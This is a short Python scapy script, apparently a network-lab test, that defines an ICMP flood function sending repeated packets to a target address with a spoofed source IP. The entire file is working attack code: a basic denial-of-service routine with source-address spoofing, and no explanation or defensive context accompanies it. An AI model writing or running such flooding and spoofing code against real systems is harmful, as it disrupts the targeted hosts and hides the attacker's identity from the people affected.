

# TO TEST ON THE NODE


from scapy.all import *

# SOURCE_IP = "10.1.5.3" # Change this IP to spoof
TARGET_IP = "10.1.5.2"

def icmp_flood(SOURCE_IP = "10.1.5.3", count=100):
    print("Sending packets...")
    ip = IP(src=SOURCE_IP, dst=TARGET_IP)
    packet = ip/ICMP()
    for _ in range(count):
        send(packet, verbose=0)